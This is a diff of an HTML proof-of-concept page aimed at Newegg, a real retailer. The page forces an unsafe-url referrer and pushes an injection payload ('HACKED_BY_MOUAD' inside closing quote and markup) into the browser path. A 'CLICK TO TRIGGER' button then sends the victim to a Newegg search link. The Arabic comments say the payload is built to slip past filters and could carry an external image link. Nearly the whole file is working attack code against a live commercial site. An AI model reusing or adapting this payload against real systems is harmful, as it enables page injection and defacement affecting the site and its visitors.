@@ -2,31 +2,26 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="referrer" content="unsafe-url"> <title>PoC Mouad</title>
+    <meta name="referrer" content="unsafe-url">
+    <title>PoC Mouad</title>
 </head>
 <body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
 
-    <h1 style="color:orange;">Newegg Exploitation Phase</h1>
-    <p>بانتظار تفعيل الثغرة...</p>
-
-    <a id="finalAttack" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       rel="unsafe-url" 
-       style="padding:20px; background:green; color:white; font-weight:bold; text-decoration:none; border-radius:10px;">
-        CLICK HERE TO TRIGGER XSS 🚀
+    <h1>Newegg Vulnerability Lab</h1>
+    <a id="attack" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
+       style="padding:20px; background:red; color:white; text-decoration:none; font-weight:bold;">
+        CLICK TO TRIGGER 🚀
     </a>
 
     <script>
-        // بايلود بسيط جداً بدون رموز معقدة لتجاوز الفلاتر
-        // سنستخدم وسم <u> (تحته خط) لإثبات الحقن
-        var payload = '"><u><h1>HACKED_BY_MOUAD</h1></u>';
+        // بايلود يستخدم ' (single quote) بدلاً من " لتجنب التشفير في بعض المتصفحات
+        // الهدف: حقن وسم <img> يحمل رابط خارجي أو يغير شكل الصفحة
+        var payload = "'><u><h1>HACKED_BY_MOUAD</h1></u>";
         
-        // بناء مسار "متزن" كما فعلنا في الكونسول
-        var attackPath = "/VORTEX/v/" + encodeURIComponent(payload) + "/";
+        // بناء المسار بحيث يكون البايلود في الجزء الثالث
+        var attackPath = "/VORTEX/v/" + payload;
 
-        // تحديث العنوان
         window.history.pushState({}, '', attackPath);
-        
-        console.log("الرابط جاهز الآن في العنوان.. اضغط على الزر الأخضر!");
     </script>
 </body>
 </html>
